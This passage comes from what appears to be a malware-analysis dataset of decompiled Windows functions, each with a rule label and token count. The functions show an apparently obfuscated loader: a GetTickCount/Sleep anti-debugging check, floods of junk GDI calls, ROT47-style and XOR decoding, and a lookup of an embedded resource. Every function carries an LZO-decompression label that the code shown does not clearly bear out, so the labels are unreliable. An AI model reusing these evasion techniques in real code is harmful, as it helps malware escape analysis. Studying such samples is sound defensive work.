return;\n}\n",
        "token_count": 340
    },
    "0048c0e8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nchar * fcn.0048c0e8(void)\n\n{\n    char *in_EAX;\n    char *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    char *pcVar5;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00404df4();\n    pcVar1 = in_EAX;\n    if (in_EAX != NULL) {\n        pcVar1 = *(in_EAX + -4);\n    }\n    if (0 < pcVar1) {\n        iVar3 = 1;\n        pcVar5 = pcVar1;\n        do {\n            uVar4 = in_EAX[iVar3 + -1];\n            pcVar1 = uVar4 - 0x7f;\n            if (uVar4 - 0x21 < 0x5e) {\n                iVar2 = fcn.004052bc();\n                pcVar1 = iVar2 + -1 + iVar3;\n                *pcVar1 = (uVar4 + 0xe) % 0x5e + '!';\n            }\n            iVar3 = iVar3 + 1;\n            pcVar5 = pcVar5 + -1;\n        } while (pcVar5 != NULL);\n    }\n    return pcVar1;\n}\n",
        "token_count": 285
    },
    "0048c168": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0048c168(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = 0x48c187;\n    fcn.00405254();\n    uStack48 = 0x48c29d;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack44 = &stack0xfffffffc;\n    fcn.00404da0();\n    iVar2 = 0;\n    if (in_EAX != 0) {\n        in_EAX = *(in_EAX + -4);\n    }\n    if (0 < in_EAX) {\n        do {\n            fcn.00404f88();\n            iVar1 = fcn.004053a8();\n            if (iVar1 + -1 < 0) break;\n            iVar1 = iVar2 + 6;\n            if (7 < iVar1) {\n                iVar1 = iVar2 + -2;\n                fcn.00404f88();\n                fcn.0040506c();\n            }\n            in_EAX = in_EAX + -1;\n            iVar2 = iVar1;\n        } while (in_EAX != 0);\n    }\n    *in_FS_OFFSET = uStack52;\n    puStack44 = 0x48c2a4;\n    uStack48 = 0x48c294;\n    fcn.00404dc4();\n    uStack48 = 0x48c29c;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 409
    },
    "0048c2f8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0048c2f8(int32_t *arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    char in_CL;\n    int32_t in_EDX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_9h;\n    uint var_4h;\n    \n    puStack40 = 0x48c315;\n    fcn.00405254();\n    puStack40 = 0x48c31d;\n    fcn.00405254();\n    uStack44 = 0x48c41a;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    iVar4 = in_EAX;\n    if (in_EAX != 0) {\n        iVar4 = *(in_EAX + -4);\n    }\n    var_14h = in_EDX;\n    if (in_EDX != 0) {\n        var_14h = *(in_EDX + -4);\n    }\n    if (iVar4 < var_14h) {\n        var_14h = iVar4;\n    }\n    puStack40 = &stack0xfffffffc;\n    fcn.004054ec();\n    if (0 < var_14h) {\n        iVar2 = 1;\n        iVar3 = var_14h;\n        do {\n            iVar1 = fcn.004052bc();\n            *(iVar1 + -1 + iVar2) = *(in_EAX + -1 + iVar2) ^ *(in_EDX + -1 + iVar2);\n            iVar2 = iVar2 + 1;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    if (in_CL == '\\0') {\n        iVar3 = var_14h + 1;\n        if (iVar3 <= iVar4) {\n            iVar4 = (iVar4 - iVar3) + 1;\n            do {\n                iVar2 = fcn.004052bc();\n                *(iVar2 + -1 + iVar3) = *(*arg_8h + -1 + (iVar3 - var_14h)) ^ *(in_EAX + -1 + iVar3);\n                iVar3 = iVar3 + 1;\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n        }\n    }\n    else {\n        iVar3 = var_14h + 1;\n        if (iVar3 <= iVar4) {\n            iVar4 = (iVar4 - iVar3) + 1;\n            do {\n                iVar2 = fcn.004052bc();\n                *(iVar2 + -1 + iVar3) = *(in_EAX + -1 + (iVar3 - var_14h)) ^ *(in_EAX + -1 + iVar3);\n                iVar3 = iVar3 + 1;\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n        }\n    }\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x48c421;\n    uStack44 = 0x48c419;\n    fcn.00404dc4();\n    return;\n}\n",
        "token_count": 739
    },
    "0048c42c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0048c42c(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x48c491;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if (in_EAX != 0) {\n        in_EAX = *(in_EAX + -4);\n    }\n    if (0 < in_EAX) {\n        do {\n            fcn.00404f88();\n            fcn.0040506c();\n            in_EAX = in_EAX + -1;\n        } while (in_EAX != 0);\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x48c498;\n    uStack28 = 0x48c490;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 230
    },
    "0048c4a0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0048c575)\n\nvoid __fastcall fcn.0048c4a0(uint param_1, int32_t param_2)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack52 = 0x48c4c2;\n    fcn.00405254();\n    puStack52 = 0x48c4ca;\n    fcn.00405254();\n    uStack56 = 0x48c5b1;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    var_18h = 1;\n    if (in_EAX != 0) {\n        in_EAX = *(in_EAX + -4);\n    }\n    puStack52 = &stack0xfffffffc;\n    puVar1 = &stack0xfffffffc;\n    var_1ch = in_EAX;\n    if (0 < in_EAX) {\n        do {\n            puStack52 = puVar1;\n            fcn.00404f88();\n            fcn.0040506c();\n            var_18h = var_18h + 1;\n            iVar2 = param_2;\n            if (param_2 != 0) {\n                iVar2 = *(param_2 + -4);\n            }\n            if (iVar2 < var_18h) {\n                var_18h = 1;\n            }\n            var_1ch = var_1ch + -1;\n            puVar1 = puStack52;\n        } while (var_1ch != 0);\n    }\n    fcn.004054ec();\n    fcn.00404df4();\n    *in_FS_OFFSET = uStack60;\n    puStack52 = 0x48c5b8;\n    uStack56 = 0x48c5a3;\n    fcn.00404da0();\n    uStack56 = 0x48c5b0;\n    fcn.00404dc4();\n    return;\n}\n",
        "token_count": 534
    },
    "0048c5c0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0048c5c0(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = 0x48c5de;\n    fcn.00405254();\n    uStack36 = 0x48c663;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    if (in_EAX != 0) {\n        in_EAX = *(in_EAX + -4);\n    }\n    puStack32 = &stack0xfffffffc;\n    if (0 < in_EAX) {\n        do {\n            fcn.00404f88();\n            fcn.0040506c();\n            in_EAX = in_EAX + -1;\n        } while (in_EAX != 0);\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x48c66a;\n    uStack36 = 0x48c65a;\n    fcn.00404da0();\n    uStack36 = 0x48c662;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 287
    },
    "0048c674": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0048c6c1)\n\nvoid __fastcall fcn.0048c674(uint *param_1)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = 0x48c692;\n    fcn.00405254();\n    puStack32 = 0x48c69a;\n    fcn.00405254();\n    uStack36 = 0x48c759;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    fcn.00404e38();\n    fcn.00405e58(0);\n    iVar1 = fcn.004053a8();\n    if (iVar1 == 0) {\n        fcn.00404df4();\n    }\n    else {\n        uStack40 = *param_1;\n        fcn.004052c4();\n        fcn.00405304();\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x48c760;\n    uStack36 = 0x48c758;\n    fcn.00404dc4();\n    return;\n}\n",
        "token_count": 315
    },
    "0048c9e8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2bah\n\nvoid fcn.0048c9e8(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uchar uVar6;\n    uint64_t uVar7;\n    ulong uVar8;\n    uint var_11c0h;\n    uint var_11bch;\n    uint var_11b8h;\n    uint var_11b4h;\n    uint var_11b0h;\n    uint var_11ach;\n    uint var_11a8h;\n    uint var_11a4h;\n    uint var_11a0h;\n    uint var_119ch;\n    uint var_1198h;\n    uint var_1194h;\n    uint var_1190h;\n    uint var_118ch;\n    uint var_1188h;\n    uint var_1184h;\n    uint var_1180h;\n    uint var_117ch;\n    uint var_1178h;\n    uint var_1174h;\n    uint var_1170h;\n    uint var_116ch;\n    uint var_1168h;\n    uint var_1164h;\n    uint var_1160h;\n    uint var_115ch;\n    uint var_1158h;\n    uint var_1154h;\n    uint var_f84h;\n    uint uStackY1156;\n    uint uStackY1152;\n    uint uStackY1148;\n    uint uStackY1144;\n    uint uStackY1140;\n    uint uStackY1136;\n    uint uStackY1132;\n    uint uStackY1128;\n    uint uStackY1124;\n    uint uStackY1120;\n    uint uStackY1116;\n    uint uStackY1112;\n    uint uStackY1108;\n    uint uStackY1104;\n    uint uStackY1100;\n    uint uStackY1096;\n    uint uStackY1092;\n    uint uStackY1088;\n    uint uStackY1084;\n    uint uStackY1080;\n    uint uStackY1076;\n    uint uStackY1072;\n    uint uStackY1068;\n    uint uStackY1064;\n    uint uVar9;\n    uint var_354h;\n    uint var_350h;\n    uint var_34ch;\n    uint var_348h;\n    uint var_344h;\n    uint var_340h;\n    uint var_33ch;\n    uint var_338h;\n    uint var_32ch;\n    uint var_328h;\n    uint var_320h;\n    uint var_31ch;\n    uint var_318h;\n    uint var_314h;\n    uint var_310h;\n    uint var_308h;\n    uint var_304h;\n    uint var_300h;\n    uint var_2fch;\n    uint var_2f8h;\n    uint var_2f4h;\n    uint var_2f0h;\n    uint var_2ech;\n    uint var_2e8h;\n    uint var_2e4h;\n    uint var_2e0h;\n    uint var_2dch;\n    uint var_2d8h;\n    uint var_2d4h;\n    uint var_2d0h;\n    uint var_2cch;\n    uint var_2c8h;\n    uint var_2c4h;\n    uint var_2c0h;\n    uint *var_2bah;\n    uint uStack696;\n    uint uStack692;\n    uint uStack688;\n    uint uStack684;\n    uint uStack680;\n    uint uStack676;\n    uint uStack672;\n    uint uStack668;\n    uint uStack664;\n    uint uStack660;\n    uint uStack656;\n    uint uStack652;\n    uint uStack648;\n    uint uStack644;\n    uint uStack640;\n    uint uStack636;\n    uint uStack632;\n    uint uStack628;\n    uint uStack624;\n    uint uStack620;\n    uint uStack616;\n    uint uStack612;\n    uint uStack608;\n    uint uStack604;\n    uint uStack600;\n    uint uStack596;\n    uint uStack592;\n    uint uStack588;\n    uint uStack584;\n    uint uStack580;\n    uint uStack576;\n    uint uStack572;\n    uint uStack568;\n    uint uStack564;\n    uint uStack560;\n    uint uStack556;\n    uint uStack552;\n    uint uStack548;\n    uint uStack544;\n    uint uStack540;\n    uint uStack536;\n    uint uStack532;\n    uint uStack528;\n    uint uStack524;\n    uint uStack520;\n    uint uStack516;\n    uint uStack512;\n    uint uStack508;\n    uint uStack504;\n    uint uStack500;\n    uint uStack496;\n    uint uStack492;\n    uint uStack488;\n    uint uStack484;\n    uint uStack480;\n    uint uStack476;\n    uint uStack472;\n    uint uStack468;\n    uint uStack464;\n    uint uStack460;\n    uint uStack456;\n    uint uStack452;\n    uint uStack448;\n    uint uStack444;\n    uint uStack440;\n    uint uStack436;\n    uint uStack432;\n    uint uStack428;\n    uint uStack424;\n    uint uStack420;\n    uint uStack416;\n    uint uStack412;\n    uint uStack408;\n    uint uStack404;\n    uint uStack400;\n    uint uStack396;\n    uint uStack392;\n    uint uStack388;\n    uint uStack384;\n    uint uStack380;\n    uint uStack376;\n    uint uStack372;\n    uint uStack368;\n    uint uStack364;\n    uint uStack360;\n    uint uStack356;\n    uint uStack352;\n    uint uStack348;\n    uint uStack344;\n    uint uStack340;\n    uint uStack336;\n    uint uStack332;\n    uint uStack328;\n    uint uStack324;\n    uint uStack320;\n    uint uStack316;\n    uint uStack312;\n    uint uStack308;\n    uint uStack304;\n    uint uStack300;\n    uint uStack296;\n    uint uStack292;\n    uint uStack288;\n    uint uStack284;\n    uint uStack280;\n    uint uStack276;\n    uint uStack272;\n    uint uStack268;\n    uint uStack264;\n    uint uStack260;\n    uint uStack256;\n    uint uStack252;\n    uint uStack248;\n    uint uStack244;\n    uint uStack240;\n    uint uStack236;\n    uint uStack232;\n    uint uStack228;\n    uint uStack224;\n    uint uStack220;\n    uint uStack216;\n    uint uStack212;\n    uint uStack208;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    code *var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    iVar5 = 0x238;\n    do {\n        var_4h = NULL;\n        iVar5 = iVar5 + -1;\n    } while (iVar5 != 0);\n    uStack28 = 0x48e47c;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    sub.gdi32.dll_GetPolyFillMode();\n    sub.gdi32.dll_GetDCBrushColor();\n    sub.gdi32.dll_GetROP2();\n    sub.gdi32.dll_GetROP2();\n    sub.gdi32.dll_GetROP2();\n    iVar5 = sub.kernel32.dll_GetTickCount();\n    sub.kernel32.dll_Sleep_2();\n    iVar2 = sub.kernel32.dll_GetTickCount();\n    if (0x1f2 < iVar2 - iVar5) {\n        sub.gdi32.dll_GetPolyFillMode();\n        sub.gdi32.dll_GetDCBrushColor();\n        sub.gdi32.dll_GetROP2();\n        sub.gdi32.dll_GetROP2();\n        sub.gdi32.dll_GetROP2();\n        puVar3 = fcn.00417dd4(10, 0x48e494);\n        (***puVar3)();\n        fcn.004054ec();\n        fcn.004052bc();\n        fcn.00402ee0();\n        fcn.00403f58();\n        sub.gdi32.dll_GetPolyFillMode();\n        uVar4 = sub.gdi32.dll_GetDCBrushColor();\n        if ((uVar4 & 0x28) == 0) {\n            puVar3 = puVar3 ^ uVar4;\n        }\n        sub.gdi32.dll_GetROP2();\n        sub.gdi32.dll_GetROP2();\n        sub.gdi32.dll_GetROP2();\n        fcn.0048c0e8();\n        sub.gdi32.dll_GetPolyFillMode();\n        uVar4 = sub.gdi32.dll_GetDCBrushColor();\n        if ((uVar4 & 0x28) == 0) {\n            puVar3 = puVar3 ^ uVar4;\n        }\n        sub.gdi32.dll_GetROP2();\n        sub.gdi32.dll_GetROP2();\n        sub.gdi32.dll_GetROP2();\n        fcn.0048c8c4();\n        fcn.0040506c();\n        fcn.00405264();\n        fcn.00404f98();\n        cVar1 = fcn.0040933c();\n        if (cVar1 == '\\0') {\n            sub.gdi32.dll_GetPolyFillMode();\n            uVar4 = sub.gdi32.dll_GetDCBrushColor();\n            if ((uVar4 & 0x28) == 0) {\n                puVar3 = puVar3 ^ uVar4;\n            }\n            sub.gdi32.dll_GetROP2();\n            sub.gdi32.dll_GetROP2();\n            sub.gdi32.dll_GetROP2();\n            fcn.0048c8c4();\n            fcn.0040506c();\n            fcn.00405264();\n            fcn.00404f98();\n            fcn.0040954c();\n        }\n        sub.gdi32.dll_GetPolyFillMode();\n        uVar4 = sub.gdi32.dll_GetDCBrushColor();\n        if ((uVar4 & 0x28) == 0) {\n            puVar3 = puVar3 ^ uVar4;\n        }\n        sub.gdi32.dll_GetROP2();\n        sub.gdi32.dll_GetROP2();\n        sub.gdi32.dll_GetROP2();\n        fcn.00405264();\n        iVar5 = sub.kernel32.dll_FindResourceA();\n        if (iVar5 == 0) {\n            sub.gdi32.dll_GetPolyFillMode();\n            uVar4 = sub.gdi32.dll_GetDCBrushColor();\n            if ((uVar4 & 0x28) == 0) {\n                puVar3 = puVar3 ^ uVar4;\n            }\n            sub.gdi32.dll_GetROP2();\n            sub.gdi32.dll_GetROP2();\n            sub.gdi32.dll_GetROP2();\n            fcn.004030dc();\n            fcn.0048c768();\n        }\n        else {\n            sub.gdi32.dll_GetPolyFillMode();\n            sub.gdi32.dll_GetDCBrushColor();\n            sub.gdi32.dll_GetROP2();\n            sub.gdi32.dll_GetROP2();\n            sub.gdi32.dll_GetROP2();\n            uStack208 = 0x48cd1c;\n            puVar3 = fcn.00417dd4(10, var_350h);\n            uStack208 = 0x48cd24;\n            (***puVar3)();\n            fcn.004054ec();\n            fcn.004052bc();\n            fcn.00402ee0();\n            fcn.00403f58();\n            sub.gdi32.dll_GetPolyFillMode();\n            uVar4 = sub.gdi32.dll_GetDCBrushColor();\n            if ((uVar4 & 0x28) == 0) {\n                puVar3 = puVar3 ^ uVar4;\n            }\n            sub.gdi32.dll_GetROP2();\n            sub.gdi32.dll_GetROP2();\n            sub.gdi32.dll_GetROP2();\n            fcn.0048c168();\n            fcn.0048c0e8();\n        }\n        sub.gdi32.dll_GetPolyFillMode();\n        uStack208 = 0x48ce35;\n        uVar7 = sub.gdi32.dll_GetDCBrushColor();\n        uStack208 = uVar7 >> 0x20;\n        if ((uVar7 & 0x28) == 0) {\n            puVar3 = puVar3 ^ uVar7;\n        }\n        uStack212 = 0x48ce44;\n        sub.gdi32.dll_GetROP2();\n        uStack212 = 0x52;\n        uStack216 = 0x48ce4b;\n        sub.gdi32.dll_GetROP2();\n        uStack216 = 0x52;\n        uStack220 = 0x48ce52;\n        sub.gdi32.dll_GetROP2();\n        uStack220 = 0x48ce63;\n        fcn.00405028();\n        uStack220 = 0x48ce7a;\n        fcn.0048c674();\n        uStack220 = 0x89068014;\n        uStack224 = 0x48ce84;\n        sub.gdi32.dll_GetPolyFillMode();\n        uStack224 = 0x7af75b21;\n        uStack228 = 0x48ce9b;\n        uVar7 = sub.gdi32.dll_GetDCBrushColor();\n        uStack228 = uVar7 >> 0x20;\n        if ((uVar7 & 0x28) == 0) {\n            puVar3 = puVar3 ^ uVar7;\n        }\n        uStack232 = 0x48ceaa;\n        sub.gdi32.dll_GetROP2();\n        uStack232 = 0x52;\n        uStack236 = 0x48ceb1;\n        sub.gdi32.dll_GetROP2();\n        uStack236 = 0x52;\n        uStack240 = 0x48ceb8;\n        sub.gdi32.dll_GetROP2();\n        uStack240 = 0x48cecc;\n        fcn.00404e38();\n        uStack240 = 0x89068014;\n        uStack244 = 0x48ced6;\n        sub.gdi32.dll_GetPolyFillMode();\n        uStack244 = 0x7af75b21;\n        uStack248 = 0x48ceed;\n        uVar7 = sub.gdi32.dll_GetDCBrushColor();\n        uStack248 = uVar7 >> 0x20;\n        if ((uVar7 & 0x28) == 0) {\n            puVar3 = puVar3 ^ uVar7;\n        }\n        uStack252 = 0x48cefc;\n        sub.gdi32.dll_GetROP2();\n        uStack252 = 0x52;\n        uStack256 = 0x48cf03;\n        sub.gdi32.dll_GetROP2();\n        uStack256 = 0x52;\n        uStack260 = 0x48cf0a;\n        sub.gdi32.dll_GetROP2();\n        uStack260 = 0x48cf1e;\n        fcn.00404e38();\n        uStack260 = 0x89068014;\n        uStack264 = 0x48cf28;\n        sub.gdi32.dll_GetPolyFillMode();\n        uStack264 = 0x7af75b21;\n        uStack268 = 0x48cf3f;\n        uVar7 = sub.gdi32.dll_GetDCBrushColor();\n        uStack268 = uVar7 >> 0x20;\n        if ((uVar7 & 0x28) == 0) {\n            puVar3 = puVar3 ^ uVar7;\n        }\n        uStack272 = 0x48cf4e;\n        sub.gdi32.dll_GetROP2();\n        uStack272 = 0x52;\n        uStack276 = 0x48cf55;\n        sub.gdi32.dll_GetROP2();\n        uStack276 = 0x52;\n        uStack280 = 0x48cf5c;\n        sub.gdi32.dll_GetROP2();\n        uStack280 = 0x48cf70;\n        fcn.00404e38();\n        uStack280 = 0x89068014;\n        uStack284 = 0x48cf7a;\n        sub.gdi32.dll_GetPolyFillMode();\n        uStack284 = 0x7af75b21;\n        uStack288 = 0x48cf91;\n        uVar7 = sub.gdi32.dll_GetDCBrushColor();\n        uStack288 = uVar7 >> 0x20;\n        if ((uVar7 & 0x28) == 0) {\n            puVar3 = puVar3 ^ uVar7;\n        }\n        uStack292 = 0x48cfa0;\n        sub.gdi32.dll_GetROP2();\n        uStack292 = 0x52;\n        uStack296 = 0x48cfa7;\n        sub.gdi32.dll_GetROP2();\n        uStack296 = 0x52;\n        uStack300 = 0x48cfae;\n        sub.gdi32.dll_GetROP2();\n        uStack300 = 0x48cfc2;\n        fcn.00404e38();\n        uStack300 = 0x89068014;\n        uStack304 = 0x48cfcc;\n        sub.gdi32.dll_GetPolyFillMode();\n        uStack304 = 0x7af75b21;\n        uStack308 = 0x48cfe3;\n        uVar7 = sub.gdi32.dll_GetDCBrushColor();\n        uStack308 = uVar7 >> 0x20;\n        if ((uVar7 & 0x28) == 0) {\n            puVar3 = puVar3 ^ uVar7;\n        }\n        uStack312 = 0x48cff2;\n        sub.gdi32.dll_GetROP2();\n        uStack312 = 0x52;\n        uStack316 = 0x48cff9;\n        sub.gdi32.dll_GetROP2();\n        uStack316 = 0x52;\n        uStack320 = 0x48d000;\n        sub.gdi32.dll_GetROP2();\n        uStack320 = 0x48d014;\n        fcn.00404e38();\n        uStack320 = 0x89068014;\n        uStack324 = 0x48d01e;\n        sub.gdi32.dll_GetPolyFillMode();\n        uStack324 = 0x7af75b21;\n        uStack328 = 0x48d035;\n        uVar7 = sub.gdi32.dll_GetDCBrushColor();\n        uStack328 = uVar7 >> 0x20;\n        if ((uVar7 & 0x28) == 0) {\n            puVar3 = puVar3 ^ uVar7;\n        }\n        uStack332 = 0x48d044;\n        sub.gdi32.dll_GetROP2();\n        uStack332 = 0x52;\n        uStack336 = 0x48d04b;\n        sub.gdi32.dll_GetROP2();\n        uStack336 = 0x52;\n        uStack340 = 0x48d052;\n        sub.gdi32.dll_GetROP2();\n        uStack340 = 0x48d066;\n        fcn.00404e38();\n        uStack340 = 0x89068014;\n        uStack344 = 0x48d070;\n        sub.gdi32.dll_GetPolyFillMode();\n        uStack344 = 0x7af75b21;\n        uStack348 = 0x48d087;\n        uVar7 = sub.gdi32.dll_GetDCBrushColor();\n        uStack348 = uVar7 >> 0x20;\n        if ((uVar7 & 0x28) == 0) {\n            puVar3 = puVar3 ^ uVar7;\n        }\n        uStack352 = 0x48d096;\n        sub.gdi32.dll_GetROP2();\n        uStack352 = 0x52;\n        uStack356 = 0x48d09d;\n        sub.gdi32.dll_GetROP2();\n        uStack356 = 0x52;\n        uStack360 = 0x48d0a4;\n        sub.gdi32.dll_GetROP2();\n        uStack360 = 0x48d0b8;\n        fcn.00404e38();\n        uStack360 = 0x89068014;\n        uStack364 = 0x48d0c2;\n        sub.gdi32.dll_GetPolyFillMode();\n        uStack364 = 0x7af75b21;\n        uStack368 = 0x48d0d9;\n        uVar7 = sub.gdi32.dll_GetDCBrushColor();\n        uStack368 = uVar7 >> 0x20;\n        if ((uVar7 & 0x28) == 0) {\n            puVar3 = puVar3 ^ uVar7;\n        }\n        uStack372 = 0x48d0e8;\n        sub.gdi32.dll_GetROP2();\n        uStack372 = 0x52;\n        uStack376 = 0x48d0ef;\n        sub.gdi32.dll_GetROP2();\n        uStack376 = 0x52;\n        uStack380 = 0x48d0f6;\n        sub.gdi32.dll_GetROP2();\n        uStack380 = 0x48d10a;\n        fcn.00404e38();\n        uStack380 = 0x89068014;\n        uStack384 = 0x48d114;\n        sub.gdi32.dll_GetPolyFillMode();\n        uStack384 = 0x7af75b21;\n        uStack388 = 0x48d12b;\n        uVar7 = sub.gdi32.dll_GetDCBrushColor();\n        uStack388 = uVar7 >> 0x20;\n        if ((uVar7 & 0x28) == 0) {\n            puVar3 = puVar3 ^ uVar7;\n        }\n        uStack392 = 0x48d13a;\n        sub.gdi32.dll_GetROP2();\n        uStack392 = 0x52;\n        uStack396 = 0x48d141;\n        sub.gdi32.dll_GetROP2();\n        uStack396 = 0x52;\n        uStack400 = 0x48d148;\n        sub.gdi32.dll_GetROP2();\n        uStack400 = 0x48d15c;\n        fcn.00404e38();\n        uStack400 = 0x89068014;\n        uStack404 = 0x48d166;\n        sub.gdi32.dll_GetPolyFillMode();\n        uStack404 = 0x7af75b21;\n        uStack408 = 0x48d17d;\n        uVar7 = sub.gdi32.dll_GetDCBrushColor();\n        uStack408 = uVar7 >> 0x20;\n        if ((uVar7 & 0x28) == 0) {\n            puVar3 = puVar3 ^ uVar7;\n        }\n        uStack412 = 0x48d18c;\n        sub.gdi32.dll_GetROP2();\n        uStack412 = 0x52;\n        uStack416 = 0x48d193;\n        sub.gdi32.dll_GetROP2();\n        uStack416 = 0x52;\n        uStack420 = 0x48d19a;\n        sub.gdi32.dll_GetROP2();\n        uStack420 = 0x48d1ae;\n        fcn.00404e38();\n        uStack420 = 0x89068014;\n        uStack424 = 0x48d1b8;\n        sub.gdi32.dll_GetPolyFillMode();\n        uStack424 = 0x7af75b21;\n        uStack428 = 0x48d1cf;\n        uVar7 = sub.gdi32.dll_GetDCBrushColor();\n        uStack428 = uVar7 >> 0x20;\n        if ((uVar7 & 0x28) == 0) {\n            puVar3 = puVar3 ^ uVar7;\n        }\n        uStack432 = 0x48d1de;\n        sub.gdi32.dll_GetROP2();\n        uStack432 = 0x52;\n        uStack436 = 0x48d1e5;\n        sub.gdi32.dll_GetROP2();\n        uStack436 = 0x52;\n        uStack440 = 0x48d1ec;\n        sub.gdi32.dll_GetROP2();\n        uStack440 = 0x48d200;\n        fcn.00404e38();\n        uStack440 = 0x89068014;\n        uStack444 = 0x48d20a;\n        sub.gdi32.dll_GetPolyFillMode();\n        uStack444 = 0x7af75b21;\n        uStack448 = 0x48d221;\n        uVar7 = sub.gdi32.dll_GetDCBrushColor();\n        uStack448 = uVar7 >> 0x20;\n        if ((uVar7 & 0x28) == 0) {\n            puVar3 = puVar3 ^ uVar7;\n        }\n        uStack452 = 0x48d230;\n        sub.gdi32.dll_GetROP2();\n        uStack452 = 0x52;\n        uStack456 = 0x48d237;\n        sub.gdi32.dll_GetROP2();\n        uStack456 = 0x52;\n        uStack460 = 0x48d23e;\n        sub.gdi32.dll_GetROP2();\n        uStack460 = 0x48d252;\n        fcn.00404e38();\n        uStack460 = 0x89068014;\n        uStack464 = 0x48d25c;\n        sub.gdi32.dll_GetPolyFillMode();\n        uStack464 = 0x7af75b21;\n        uStack468 = 0x48d273;\n        uVar7 = sub.gdi32.dll_GetDCBrushColor();\n        uStack468 = uVar7 >> 0x20;\n        if ((uVar7 & 0x28) == 0) {\n            puVar3 = puVar3 ^ uVar7;\n        }\n        uStack472 = 0x48d282;\n        sub.gdi32.dll_GetROP2();\n        uStack472 = 0x52;\n        uStack476 = 0x48d289;\n        sub.gdi32.dll_GetROP2();\n        uStack476 = 0x52;\n        uStack480 = 0x48d290;\n        sub.gdi32.dll_GetROP2();\n        uStack480 = 0x48d2a4;\n        fcn.00404e38();\n        uStack480 = 0x89068014;\n        uStack484 = 0x48d2ae;\n        sub.gdi32.dll_GetPolyFillMode();\n        uStack484 = 0x7af75b21;\n        uStack488 = 0x48d2c5;\n        uVar7 = sub.gdi32.dll_GetDCBrushColor();\n        uStack488 = uVar7 >> 0x20;\n        if ((uVar7 & 0x28) == 0) {\n            puVar3 = puVar3 ^ uVar7;\n        }\n        uStack492 = 0x48d2d4;\n        sub.gdi32.dll_GetROP2();\n        uStack492 = 0x52;\n        uStack496 = 0x48d2db;\n        sub.gdi32.dll_GetROP2();\n        uStack496 = 0x52;\n        uStack500 = 0x48d2e2;\n        sub.gdi32.dll_GetROP2();\n        uStack500 = 0x48d2f6;\n        fcn.00404e38();\n        uStack500 = 0x89068014;\n        uStack504 = 0x48d300;\n        sub.gdi32.dll_GetPolyFillMode();\n        uStack504 = 0x7af75b21;\n        uStack508 = 